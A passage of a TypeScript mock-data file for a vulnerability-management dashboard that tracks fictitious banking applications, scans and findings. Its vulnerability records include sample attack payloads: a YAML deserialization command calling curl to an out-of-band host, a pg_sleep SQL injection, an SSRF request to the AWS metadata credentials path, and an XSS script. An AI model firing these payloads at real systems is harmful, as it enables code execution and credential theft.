import {
  ApplicationResponse,
  AppTrendsResponse,
  ApiKeyResponse,
  CreateApiKeyRequest,
  CreateApiKeyResponse,
  CreateApplicationRequest,
  DashboardSummary,
  PaginatedResponse,
  RemediationAuditLogResponse,
  ScanComparisonResponse,
  ScanResponse,
  TriggerScanRequest,
  UpdateApplicationRequest,
  UpdateVulnerabilityRequest,
  UserProfile,
  VulnerabilityDetail,
  VulnerabilitySummary,
  VulnFilterParams,
} from '../types';

/**
 * Mock Current User (SecOps Admin Profile)
 */
export const MOCK_CURRENT_USER: UserProfile = {
  id: 'a0000000-0000-0000-0000-000000000001',
  email: 'admin@kds.local',
  full_name: 'Alex Mercer (SecOps Admin)',
  role: 'admin',
  is_active: true,
  last_login_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
  created_at: '2026-01-01T00:00:00Z',
};

/**
 * Mock API Keys
 */
export let mockApiKeys: ApiKeyResponse[] = [
  {
    id: 'k0000001-0000-0000-0000-000000000001',
    name: 'GitHub Actions AppSec CI',
    key_prefix: 'appsec_live_9f8a',
    expires_at: '2027-12-31T23:59:59Z',
    last_used_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    created_at: '2026-02-10T10:00:00Z',
  },
  {
    id: 'k0000002-0000-0000-0000-000000000002',
    name: 'GitLab Security Gate',
    key_prefix: 'appsec_live_3b1c',
    expires_at: null,
    last_used_at: new Date(Date.now() - 1000 * 60 * 60 * 6).toISOString(),
    created_at: '2026-03-01T14:30:00Z',
  },
];

/**
 * Mock Applications Inventory
 */
export let mockApplications: ApplicationResponse[] = [
  {
    id: '11111111-1111-1111-1111-111111111111',
    name: 'Core Banking Payment Gateway',
    description: 'PCI-DSS tier 1 cardholder transaction processing and ledger API',
    base_url: 'https://pay.internal-kds.net',
    environment: 'production',
    criticality: 'critical',
    owner_id: 'a0000000-0000-0000-0000-000000000001',
    team_name: 'Payment Infrastructure',
    include_regexes: ['^https://pay\\.internal-kds\\.net/api/v1/.*'],
    exclude_regexes: ['^https://pay\\.internal-kds\\.net/api/v1/admin/debug'],
    has_auth_configured: true,
    cron_schedule: '0 2 * * *',
    is_authorized: true,
    latest_risk_score: 78.4,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    open_counts: {
      critical: 2,
      high: 3,
      medium: 4,
      low: 2,
      info: 1,
    },
    created_at: '2026-01-15T08:00:00Z',
  },
  {
    id: '22222222-2222-2222-2222-222222222222',
    name: 'Customer Web Portal & SPA',
    description: 'React single page app for retail banking customers and mobile proxy',
    base_url: 'https://portal.kds-bank.com',
    environment: 'production',
    criticality: 'high',
    owner_id: 'a0000000-0000-0000-0000-000000000001',
    team_name: 'Front-Office Frontend',
    include_regexes: ['^https://portal\\.kds-bank\\.com/.*'],
    exclude_regexes: ['^https://portal\\.kds-bank\\.com/logout'],
    has_auth_configured: true,
    cron_schedule: '0 4 * * 1',
    is_authorized: true,
    latest_risk_score: 42.1,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(),
    open_counts: {
      critical: 0,
      high: 2,
      medium: 5,
      low: 6,
      info: 3,
    },
    created_at: '2026-02-01T11:20:00Z',
  },
  {
    id: '33333333-3333-3333-3333-333333333333',
    name: 'Identity & OAuth2 Provider',
    description: 'Centralized Keycloak/OAuth2 authentication and session gateway',
    base_url: 'https://auth.staging.kds-bank.com',
    environment: 'staging',
    criticality: 'high',
    owner_id: 'a0000000-0000-0000-0000-000000000001',
    team_name: 'IAM SecOps',
    include_regexes: ['^https://auth\\.staging\\.kds-bank\\.com/oauth/.*'],
    exclude_regexes: [],
    has_auth_configured: false,
    cron_schedule: null,
    is_authorized: true,
    latest_risk_score: 18.0,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 60 * 24).toISOString(),
    open_counts: {
      critical: 0,
      high: 1,
      medium: 2,
      low: 3,
      info: 2,
    },
    created_at: '2026-02-20T16:45:00Z',
  },
  {
    id: '44444444-4444-4444-4444-444444444444',
    name: 'Partner Settlement Microservice',
    description: 'Internal B2B batch reconciliation REST API for SWIFT / ACH',
    base_url: 'https://settlement.qa.internal',
    environment: 'qa',
    criticality: 'medium',
    owner_id: null,
    team_name: 'Clearing Team',
    include_regexes: ['^https://settlement\\.qa\\.internal/api/.*'],
    exclude_regexes: [],
    has_auth_configured: true,
    cron_schedule: null,
    is_authorized: true,
    latest_risk_score: 12.5,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 60 * 48).toISOString(),
    open_counts: {
      critical: 0,
      high: 0,
      medium: 2,
      low: 4,
      info: 1,
    },
    created_at: '2026-03-05T09:15:00Z',
  },
];

/**
 * Mock Scans
 */
export let mockScans: ScanResponse[] = [
  {
    id: 's0000001-0000-0000-0000-000000000001',
    application_id: '11111111-1111-1111-1111-111111111111',
    scan_type: 'full_active',
    status: 'active_scanning',
    progress_percent: 64,
    severity_counts: {
      critical: 2,
      high: 3,
      medium: 4,
      low: 2,
      info: 1,
    },
    diff_summary: {
      previous_scan_id: 's0000002-0000-0000-0000-000000000002',
      new_count: 1,
      persistent_count: 9,
      fixed_count: 2,
      regressed_count: 1,
      risk_score_delta: -4.5,
    },
    overall_risk_score: 78.4,
    started_at: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    completed_at: null,
    duration_seconds: 1080,
    error_message: null,
  },
  {
    id: 's0000002-0000-0000-0000-000000000002',
    application_id: '11111111-1111-1111-1111-111111111111',
    scan_type: 'full_active',
    status: 'completed',
    progress_percent: 100,
    severity_counts: {
      critical: 2,
      high: 4,
      medium: 5,
      low: 3,
      info: 2,
    },
    diff_summary: {
      previous_scan_id: null,
      new_count: 16,
      persistent_count: 0,
      fixed_count: 0,
      regressed_count: 0,
      risk_score_delta: 82.9,
    },
    overall_risk_score: 82.9,
    started_at: '2026-11-20T02:00:00Z',
    completed_at: '2026-11-20T02:35:40Z',
    duration_seconds: 2140,
    error_message: null,
  },
  {
    id: 's0000003-0000-0000-0000-000000000003',
    application_id: '22222222-2222-2222-2222-222222222222',
    scan_type: 'spa_ajax',
    status: 'completed',
    progress_percent: 100,
    severity_counts: {
      critical: 0,
      high: 2,
      medium: 5,
      low: 6,
      info: 3,
    },
    diff_summary: {
      previous_scan_id: null,
      new_count: 16,
      persistent_count: 0,
      fixed_count: 0,
      regressed_count: 0,
      risk_score_delta: 42.1,
    },
    overall_risk_score: 42.1,
    started_at: '2026-11-21T04:00:00Z',
    completed_at: '2026-11-21T04:42:15Z',
    duration_seconds: 2535,
    error_message: null,
  },
  {
    id: 's0000004-0000-0000-0000-000000000004',
    application_id: '33333333-3333-3333-3333-333333333333',
    scan_type: 'api_openapi',
    status: 'queued',
    progress_percent: 0,
    severity_counts: {
      critical: 0,
      high: 0,
      medium: 0,
      low: 0,
      info: 0,
    },
    diff_summary: {
      previous_scan_id: null,
      new_count: 0,
      persistent_count: 0,
      fixed_count: 0,
      regressed_count: 0,
      risk_score_delta: 0,
    },
    overall_risk_score: 0,
    started_at: null,
    completed_at: null,
    duration_seconds: null,
    error_message: null,
  },
];

/**
 * Mock Vulnerabilities
 */
export let mockVulnerabilities: VulnerabilityDetail[] = [
  {
    id: 'v0000001-0000-0000-0000-000000000001',
    application_id: '11111111-1111-1111-1111-111111111111',
    fingerprint: 'a8b9c0d1e2f3456789abcdef0123456789abcdef0123456789abcdef01234567',
    title: 'Remote Code Execution via Insecure YAML Deserialization',
    owasp_category: 'A08:2021-Software and Data Integrity Failures',
    cwe_id: 502,
    severity: 'critical',
    cvss_score: 9.8,
    status: 'open',
    http_method: 'POST',
    normalized_path: '/api/v1/config/import',
    affected_param: 'config_payload',
    assigned_to: 'a0000000-0000-0000-0000-000000000001',
    seen_count: 3,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
    zap_plugin_id: '90034',
    wasc_id: 20,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    confidence: 'High',
    affected_url: 'https://pay.internal-kds.net/api/v1/config/import',
    description:
      'The endpoint accepts arbitrary serialized YAML payloads and parses them using an unsafe object loader. An unauthenticated attacker can execute arbitrary system commands on the host server.',
    solution:
      'Migrate to a safe parser such as yaml.safe_load() or strict JSON schema validation. Disallow deserialization of custom Ruby/Python/Java runtime tags.',
    reference_urls: [
      'https://cwe.mitre.org/data/definitions/502.html',
      'https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/',
    ],
    due_date: new Date(Date.now() + 1000 * 60 * 60 * 24 * 3).toISOString(),
    latest_evidence: {
      scan_id: 's0000001-0000-0000-0000-000000000001',
      diff_state: 'persistent',
      attack_payload: "!!python/object/apply:os.system ['curl http://burpcollaborator.net']",
      evidence_snippet: 'Status 200 OK - subprocess spawned: curl http://burpcollaborator.net',
      raw_request_header:
        'POST /api/v1/config/import HTTP/1.1\r\nHost: pay.internal-kds.net\r\nContent-Type: application/x-yaml\r\nX-Forwarded-For: 10.0.4.12',
      raw_response_header:
        'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nServer: gunicorn/21.2.0',
    },
    first_seen_at: '2026-11-18T02:00:00Z',
    resolved_at: null,
  },
  {
    id: 'v0000002-0000-0000-0000-000000000002',
    application_id: '11111111-1111-1111-1111-111111111111',
    fingerprint: 'b1c2d3e4f5a67890123456789abcdef0123456789abcdef0123456789abcdef0',
    title: 'Time-Based Blind SQL Injection in Authorization Header',
    owasp_category: 'A03:2021-Injection',
    cwe_id: 89,
    severity: 'critical',
    cvss_score: 9.1,
    status: 'in_progress',
    http_method: 'GET',
    normalized_path: '/api/v1/transactions/ledger',
    affected_param: 'X-Session-Token',
    assigned_to: 'a0000000-0000-0000-0000-000000000001',
    seen_count: 5,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    zap_plugin_id: '40018',
    wasc_id: 19,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    confidence: 'High',
    affected_url: 'https://pay.internal-kds.net/api/v1/transactions/ledger',
    description:
      'The X-Session-Token header value is concatenated directly into a dynamic PostgreSQL query within the session verification middleware, allowing an attacker to exfiltrate database contents via pg_sleep() timing vectors.',
    solution:
      'Use parameterized queries or prepared statements via sqlx/Diesel. Never concatenate raw HTTP headers directly into SQL statements.',
    reference_urls: [
      'https://cwe.mitre.org/data/definitions/89.html',
      'https://owasp.org/Top10/A03_2021-Injection/',
    ],
    due_date: new Date(Date.now() + 1000 * 60 * 60 * 24 * 7).toISOString(),
    latest_evidence: {
      scan_id: 's0000001-0000-0000-0000-000000000001',
      diff_state: 'persistent',
      attack_payload: "tok_test' OR (SELECT 1 FROM pg_sleep(5))=1 --",
      evidence_snippet: 'HTTP response delayed by exactly 5032 ms matching sleep payload',
      raw_request_header:
        "GET /api/v1/transactions/ledger HTTP/1.1\r\nHost: pay.internal-kds.net\r\nX-Session-Token: tok_test' OR (SELECT 1 FROM pg_sleep(5))=1 --\r\nAccept: application/json",
      raw_response_header:
        'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Runtime: 5.041289',
    },
    first_seen_at: '2026-11-10T14:30:00Z',
    resolved_at: null,
  },
  {
    id: 'v0000003-0000-0000-0000-000000000003',
    application_id: '11111111-1111-1111-1111-111111111111',
    fingerprint: 'c2d3e4f5a6b7890123456789abcdef0123456789abcdef0123456789abcdef01',
    title: 'Server-Side Request Forgery (SSRF) in Webhook Dispatcher',
    owasp_category: 'A10:2021-Server-Side Request Forgery',
    cwe_id: 918,
    severity: 'high',
    cvss_score: 8.6,
    status: 'open',
    http_method: 'POST',
    normalized_path: '/api/v1/webhooks/test',
    affected_param: 'endpoint_url',
    assigned_to: null,
    seen_count: 2,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
    zap_plugin_id: '40046',
    wasc_id: 15,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N',
    confidence: 'High',
    affected_url: 'https://pay.internal-kds.net/api/v1/webhooks/test',
    description:
      'The webhook testing feature allows users to provide an arbitrary URL. The backend fetches this URL without validating RFC1918 private IP ranges or AWS cloud metadata endpoints (169.254.169.254).',
    solution:
      'Enforce an allowlist of permitted domain suffixes, block loopback (127.0.0.1/8) and link-local IP addresses (169.254.169.254), and resolve DNS records prior to connection to guard against DNS rebinding.',
    reference_urls: [
      'https://cwe.mitre.org/data/definitions/918.html',
      'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/',
    ],
    due_date: new Date(Date.now() + 1000 * 60 * 60 * 24 * 14).toISOString(),
    latest_evidence: {
      scan_id: 's0000001-0000-0000-0000-000000000001',
      diff_state: 'new',
      attack_payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      evidence_snippet: '"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"ASIA..."',
      raw_request_header:
        'POST /api/v1/webhooks/test HTTP/1.1\r\nHost: pay.internal-kds.net\r\nContent-Type: application/json\r\nAuthorization: Bearer <jwt>',
      raw_response_header:
        'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Webhook-Latency: 12ms',
    },
    first_seen_at: '2026-11-21T02:15:00Z',
    resolved_at: null,
  },
  {
    id: 'v0000004-0000-0000-0000-000000000004',
    application_id: '22222222-2222-2222-2222-222222222222',
    fingerprint: 'd3e4f5a6b7c890123456789abcdef0123456789abcdef0123456789abcdef012',
    title: 'Broken Object Level Authorization (BOLA) in Document Retrieval',
    owasp_category: 'A01:2021-Broken Access Control',
    cwe_id: 639,
    severity: 'high',
    cvss_score: 8.1,
    status: 'regressed',
    http_method: 'GET',
    normalized_path: '/api/v1/users/statements/:id',
    affected_param: 'id',
    assigned_to: 'a0000000-0000-0000-0000-000000000001',
    seen_count: 4,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    zap_plugin_id: '40035',
    wasc_id: 2,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
    confidence: 'Medium',
    affected_url: 'https://portal.kds-bank.com/api/v1/users/statements/98421',
    description:
      'Any authenticated customer can access PDF tax and statement records belonging to any other customer by altering the integer statement ID in the URL path.',
    solution:
      'Enforce record ownership checks inside database queries using WHERE user_id = :authenticated_user_id and migrate to non-sequential UUIDv4 tokens.',
    reference_urls: [
      'https://cwe.mitre.org/data/definitions/639.html',
      'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/',
    ],
    due_date: new Date(Date.now() + 1000 * 60 * 60 * 24 * 5).toISOString(),
    latest_evidence: {
      scan_id: 's0000003-0000-0000-0000-000000000003',
      diff_state: 'regressed',
      attack_payload: '/api/v1/users/statements/98421 (Targeting another tenant)',
      evidence_snippet: 'Document returned belonging to John Doe (account: #8832-1192)',
      raw_request_header:
        'GET /api/v1/users/statements/98421 HTTP/1.1\r\nHost: portal.kds-bank.com\r\nAuthorization: Bearer <attacker_jwt>',
      raw_response_header:
        'HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment',
    },
    first_seen_at: '2026-10-15T09:00:00Z',
    resolved_at: null,
  },
  {
    id: 'v0000005-0000-0000-0000-000000000005',
    application_id: '22222222-2222-2222-2222-222222222222',
    fingerprint: 'e4f5a6b7c8d90123456789abcdef0123456789abcdef0123456789abcdef0123',
    title: 'Cross-Site Scripting (Reflected) in Transaction Search Filter',
    owasp_category: 'A03:2021-Injection',
    cwe_id: 79,
    severity: 'medium',
    cvss_score: 6.1,
    status: 'risk_accepted',
    http_method: 'GET',
    normalized_path: '/portal/transactions',
    affected_param: 'filter_keyword',
    assigned_to: null,
    seen_count: 6,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
    zap_plugin_id: '40012',
    wasc_id: 8,
    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    confidence: 'High',
    affected_url: 'https://portal.kds-bank.com/portal/transactions?filter_keyword=<script>',
    description:
      'User input provided via the filter_keyword GET query parameter is echoed verbatim into the search results page header without sanitization.',
    solution:
      'Ensure all dynamic expressions in JSX/HTML are properly entity-encoded and deploy a Content-Security-Policy (CSP) header blocking inline script execution.',
    reference_urls: [
      'https://cwe.mitre.org/data/definitions/79.html',
      'https://owasp.org/Top10/A03_2021-Injection/',
    ],
    due_date: null,
    latest_evidence: {
      scan_id: 's0000003-0000-0000-0000-000000000003',
      diff_state: 'persistent',
      attack_payload: "<script>alert('kds_xss_proof')</script>",
      evidence_snippet: "<h3>Results for <script>alert('kds_xss_proof')</script></h3>",
      raw_request_header:
        "GET /portal/transactions?filter_keyword=%3Cscript%3Ealert('kds_xss_proof')%3C/script%3E HTTP/1.1\r\nHost: portal.kds-bank.com",
      raw_response_header:
        'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nX-XSS-Protection: 0',
    },
    first_seen_at: '2026-10-01T12:00:00Z',
    resolved_at: null,
  },
  {
    id: 'v0000006-0000-0000-0000-000000000006',
    application_id: '33333333-3333-3333-3333-333333333333',
    fingerprint: 'f5a6b7c8d9e0123456789abcdef0123456789abcdef0123456789abcdef01234',
    title: 'Missing HTTP Strict Transport Security (HSTS) Header',
    owasp_category: 'A05:2021-Security Misconfiguration',
    cwe_id: 319,
    severity: 'low',
    cvss_score: 3.8,
    status: 'open',
    http_method: 'GET',
    normalized_path: '/oauth/token',
    affected_param: null,
    assigned_to: null,
    seen_count: 8,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 300).toISOString(),
    zap_plugin_id: '10035',
    wasc_id: 15,
    cvss_vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N',
    confidence: 'High',
    affected_url: 'https://auth.staging.kds-bank.com/oauth/token',
    description:
      'The response does not include the Strict-Transport-Security header, allowing man-in-the-middle attackers to perform SSL-stripping attacks against unencrypted initial HTTP connections.',
    solution:
      'Add the header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload in your reverse proxy config.',
    reference_urls: ['https://cwe.mitre.org/data/definitions/319.html'],
    due_date: new Date(Date.now() + 1000 * 60 * 60 * 24 * 30).toISOString(),
    latest_evidence: {
      scan_id: 's0000002-0000-0000-0000-000000000002',
      diff_state: 'persistent',
      attack_payload: null,
      evidence_snippet: 'Strict-Transport-Security header was not found in response',
      raw_request_header: 'GET /oauth/token HTTP/1.1\r\nHost: auth.staging.kds-bank.com',
      raw_response_header:
        'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nServer: nginx',
    },
    first_seen_at: '2026-09-12T08:00:00Z',
    resolved_at: null,
  },
  {
    id: 'v0000007-0000-0000-0000-000000000007',
    application_id: '11111111-1111-1111-1111-111111111111',
    fingerprint: 'a6b7c8d9e0f1123456789abcdef0123456789abcdef0123456789abcdef01235',
    title: 'Server Banner Leaks Internal Web Server Version (nginx/1.24.0)',
    owasp_category: 'A05:2021-Security Misconfiguration',
    cwe_id: 200,
    severity: 'info',
    cvss_score: 0.0,
    status: 'resolved',
    http_method: 'GET',
    normalized_path: '/',
    affected_param: 'Server Header',
    assigned_to: 'a0000000-0000-0000-0000-000000000001',
    seen_count: 12,
    last_seen_at: new Date(Date.now() - 1000 * 60 * 400).toISOString(),
    zap_plugin_id: '10036',
    wasc_id: 13,
    cvss_vector: null,
    confidence: 'High',
    affected_url: 'https://pay.internal-kds.net/',
    description:
      'The web server leaks its product name and version number via the Server HTTP response header.',
    solution: 'Configure server_tokens off; in nginx configuration.',
    reference_urls: ['https://cwe.mitre.org/data/definitions/200.html'],
    due_date: null,
    latest_evidence: null,
    first_seen_at: '2026-08-01T10:00:00Z',
    resolved_at: '2026-11-15T16:00:00Z',
  },
];

/**
 * Mock Audit Logs
 */
export let mockAuditLogs: Record<string, RemediationAuditLogResponse[]> = {
  'v0000001-0000-0000-0000-000000000001': [
    {
      id: 'l0000001-0000-0000-0000-000000000001',
      vulnerability_id: 'v0000001-0000-0000-0000-000000000001',
      actor_id: 'a0000000-0000-0000-0000-000000000001',
      scan_id: 's0000001-0000-0000-0000-000000000001',
      action_type: 'DETECTED',
      old_status: null,
      new_status: 'open',
      comment: 'Discovered during scheduled active attack assessment',
      created_at: '2026-11-18T02:00:00Z',
    },
    {
      id: 'l0000002-0000-0000-0000-000000000002',
      vulnerability_id: 'v0000001-0000-0000-0000-000000000001',
      actor_id: 'a0000000-0000-0000-0000-000000000001',
      scan_id: null,
      action_type: 'TRIAGE_NOTE',
      old_status: 'open',
      new_status: 'open',
      comment:
        'Escalated to Payment Engineering sprint. Priority P0 due to remote code execution risk.',
      created_at: '2026-11-19T10:15:00Z',
    },
  ],
  'v0000002-0000-0000-0000-000000000002': [
    {
      id: 'l0000003-0000-0000-0000-000000000003',
      vulnerability_id: 'v0000002-0000-0000-0000-000000000002',
      actor_id: 'a0000000-0000-0000-0000-000000000001',
      scan_id: null,
      action_type: 'STATUS_CHANGE',
      old_status: 'open',
      new_status: 'in_progress',
      comment: 'Dev team is actively parameterizing the authorization query.',
      created_at: '2026-11-14T11:00:00Z',
    },
  ],
};

/**
 * Mock Historical Risk Trends
 */
export const MOCK_APP_TRENDS: Record<string, AppTrendsResponse> = {
  '11111111-1111-1111-1111-111111111111': {
    app_id: '11111111-1111-1111-1111-111111111111',
    data_points: [
      {
        timestamp: '2026-10-01T00:00:00Z',
        scan_id: null,
        risk_score: 92.0,
        severity_counts: { critical: 4, high: 6, medium: 8, low: 4, info: 3 },
      },
      {
        timestamp: '2026-10-15T00:00:00Z',
        scan_id: null,
        risk_score: 88.5,
        severity_counts: { critical: 3, high: 5, medium: 7, low: 4, info: 2 },
      },
      {
        timestamp: '2026-11-01T00:00:00Z',
        scan_id: null,
        risk_score: 84.0,
        severity_counts: { critical: 3, high: 4, medium: 6, low: 3, info: 2 },
      },
      {
        timestamp: '2026-11-15T00:00:00Z',
        scan_id: 's0000002-0000-0000-0000-000000000002',
        risk_score: 82.9,
        severity_counts: { critical: 2, high: 4, medium: 5, low: 3, info: 2 },
      },
      {
        timestamp: new Date().toISOString(),
        scan_id: 's0000001-0000-0000-0000-000000000001',
        risk_score: 78.4,
        severity_counts: { critical: 2, high: 3, medium: 4, low: 2, info: 1 },
      },
    ],
  },
};

/**
 * Helper to compute Mock Dashboard Summary
 */
export function getMockDashboardSummary(): DashboardSummary {
  const totalApps = mockApplications.length;
  const avgRisk =
    totalApps > 0
      ? mockApplications.reduce((acc, a) => acc + a.latest_risk_score, 0) / totalApps
      : 0;

  const summaries: VulnerabilitySummary[] = mockVulnerabilities.map((v) => ({
    id: v.id,
    application_id: v.application_id,
    fingerprint: v.fingerprint,
    title: v.title,
    owasp_category: v.owasp_category,
    cwe_id: v.cwe_id,
    severity: v.severity,
    cvss_score: v.cvss_score,
    status: v.status,
    http_method: v.http_method,
    normalized_path: v.normalized_path,
    affected_param: v.affected_param,
    assigned_to: v.assigned_to,
    seen_count: v.seen_count,
    last_seen_at: v.last_seen_at,
  }));

  const severityCounts = {
    critical: mockVulnerabilities.filter((v) => v.severity === 'critical' && v.status !== 'resolved')
      .length,
    high: mockVulnerabilities.filter((v) => v.severity === 'high' && v.status !== 'resolved').length,
    medium: mockVulnerabilities.filter((v) => v.severity === 'medium' && v.status !== 'resolved')
      .length,
    low: mockVulnerabilities.filter((v) => v.severity === 'low' && v.status !== 'resolved').length,
    info: mockVulnerabilities.filter((v) => v.severity === 'info' && v.status !== 'resolved').length,
  };

  const owaspCounts: Record<string, number> = {};
  for (const v of mockVulnerabilities) {
    owaspCounts[v.owasp_category] = (owaspCounts[v.owasp_category] || 0) + 1;
  }
  const totalOwasp = Object.values(owaspCounts).reduce((a, b) => a + b, 0);
  const owaspBreakdown = Object.entries(owaspCounts).map(([cat, count]) => ({
    category: cat,
    count,
    percentage: Math.round((count / (totalOwasp || 1)) * 100),
  }));

  return {
    total_applications: totalApps,
    average_risk_score: Number(avgRisk.toFixed(1)),
    total_vulnerabilities: mockVulnerabilities.length,
    vulnerabilities: summaries,
    severity_counts: severityCounts,
    owasp_breakdown: owaspBreakdown,
    sla_compliance: {
      critical_within_sla: 1,
      critical_breached: 1,
      high_within_sla: 2,
      high_breached: 1,
      overall_compliance_rate: 60,
    },
    active_scans_count: mockScans.filter((s) => s.status === 'active_scanning' || s.status === 'spidering').length,
  };
}

/**
 * State Mutation Operations for Standalone Offline Functionality
 */

export function getMockApps(envFilter?: string): ApplicationResponse[] {
  if (!envFilter) return [...mockApplications];
  return mockApplications.filter((a) => a.environment === envFilter);
}

export function getMockApp(id: string): ApplicationResponse | null {
  return mockApplications.find((a) => a.id === id) || null;
}

export function createMockApp(req: CreateApplicationRequest): ApplicationResponse {
  const newApp: ApplicationResponse = {
    id: `app-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    name: req.name,
    description: req.description || null,
    base_url: req.base_url,
    environment: req.environment,
    criticality: req.criticality,
    owner_id: MOCK_CURRENT_USER.id,
    team_name: req.team_name || null,
    include_regexes: req.include_regexes || [],
    exclude_regexes: req.exclude_regexes || [],
    has_auth_configured: false,
    cron_schedule: req.cron_schedule || null,
    is_authorized: req.is_authorized,
    latest_risk_score: 0.0,
    last_scanned_at: null,
    open_counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
    created_at: new Date().toISOString(),
  };
  mockApplications.unshift(newApp);
  return newApp;
}

export function updateMockApp(id: string, req: UpdateApplicationRequest): ApplicationResponse {
  const idx = mockApplications.findIndex((a) => a.id === id);
  if (idx === -1) throw new Error('Application not found');
  const existing = mockApplications[idx];
  const updated: ApplicationResponse = {
    ...existing,
    name: req.name ?? existing.name,
    description: req.description !== undefined ? req.description : existing.description,
    environment: req.environment ?? existing.environment,
    criticality: req.criticality ?? existing.criticality,
    team_name: req.team_name !== undefined ? req.team_name : existing.team_name,
    include_regexes: req.include_regexes ?? existing.include_regexes,
    exclude_regexes: req.exclude_regexes ?? existing.exclude_regexes,
    cron_schedule: req.cron_schedule !== undefined ? req.cron_schedule : existing.cron_schedule,
  };
  mockApplications[idx] = updated;
  return updated;
}

export function deleteMockApp(id: string): boolean {
  const initial = mockApplications.length;
  mockApplications = mockApplications.filter((a) => a.id !== id);
  return mockApplications.length < initial;
}

export function configureMockAppAuth(id: string): boolean {
  const app = mockApplications.find((a) => a.id === id);
  if (!app) return false;
  app.has_auth_configured = true;
  return true;
}

export function getMockScans(appId?: string): ScanResponse[] {
  if (appId) {
    return mockScans.filter((s) => s.application_id === appId);
  }
  return [...mockScans];
}

export function getMockScan(id: string): ScanResponse | null {
  return mockScans.find((s) => s.id === id) || null;
}

export function triggerMockScan(appId: string, req: TriggerScanRequest): ScanResponse {
  const newScan: ScanResponse = {
    id: `scan-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    application_id: appId,
    scan_type: req.scan_type,
    status: 'queued',
    progress_percent: 0,
    severity_counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
    diff_summary: {
      previous_scan_id: null,
      new_count: 0,
      persistent_count: 0,
      fixed_count: 0,
      regressed_count: 0,
      risk_score_delta: 0,
    },
    overall_risk_score: 0,
    started_at: new Date().toISOString(),
    completed_at: null,
    duration_seconds: null,
    error_message: null,
  };
  mockScans.unshift(newScan);
  return newScan;
}

export function cancelMockScan(id: string): ScanResponse {
  const scan = mockScans.find((s) => s.id === id);
  if (!scan) throw new Error('Scan not found');
  scan.status = 'cancelled';
  scan.completed_at = new Date().toISOString();
  return scan;
}

export function compareMockScans(baseId: string, targetId: string): ScanComparisonResponse {
  return {
    base_scan_id: baseId,
    target_scan_id: targetId,
    diff_summary: {
      previous_scan_id: baseId,
      new_count: 2,
      persistent_count: 8,
      fixed_count: 3,
      regressed_count: 1,
      risk_score_delta: -5.4,
    },
  };
}

export function getMockVulns(params?: VulnFilterParams): PaginatedResponse<VulnerabilitySummary> {
  let list = [...mockVulnerabilities];
  if (params?.app_id || params?.application_id) {
    const aid = params.app_id || params.application_id;
    list = list.filter((v) => v.application_id === aid);
  }
  if (params?.severity) {
    list = list.filter((v) => v.severity === params.severity);
  }
  if (params?.status) {
    list = list.filter((v) => v.status === params.status);
  }
  if (params?.owasp_category) {
    list = list.filter((v) => v.owasp_category.includes(params.owasp_category!));
  }
  if (params?.search) {
    const q = params.search.toLowerCase();
    list = list.filter(
      (v) =>
        v.title.toLowerCase().includes(q) ||
        v.normalized_path.toLowerCase().includes(q) ||
        v.fingerprint.toLowerCase().includes(q)
    );
  }

  const page = params?.page || 1;
  const perPage = params?.per_page || 20;
  const total = list.length;
  const totalPages = Math.ceil(total / perPage) || 1;
  const start = (page - 1) * perPage;
  const items = list.slice(start, start + perPage);

  return {
    items,
    total,
    page,
    per_page: perPage,
    total_pages: totalPages,
  };
}

export function getMockVuln(id: string): VulnerabilityDetail | null {
  return mockVulnerabilities.find((v) => v.id === id) || null;
}

export function updateMockVuln(id: string, req: UpdateVulnerabilityRequest): VulnerabilityDetail {
  const vuln = mockVulnerabilities.find((v) => v.id === id);
  if (!vuln) throw new Error('Vulnerability not found');

  const oldStatus = vuln.status;
  if (req.status) vuln.status = req.status;
  if (req.severity) vuln.severity = req.severity;
  if (req.assigned_to !== undefined) vuln.assigned_to = req.assigned_to;
  if (req.due_date !== undefined) vuln.due_date = req.due_date;
  if (req.status === 'resolved' || req.status === 'verified_fixed') {
    vuln.resolved_at = new Date().toISOString();
  }

  if (req.comment || req.status) {
    if (!mockAuditLogs[id]) mockAuditLogs[id] = [];
    mockAuditLogs[id].unshift({
      id: `log-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
      vulnerability_id: id,
      actor_id: MOCK_CURRENT_USER.id,
      scan_id: null,
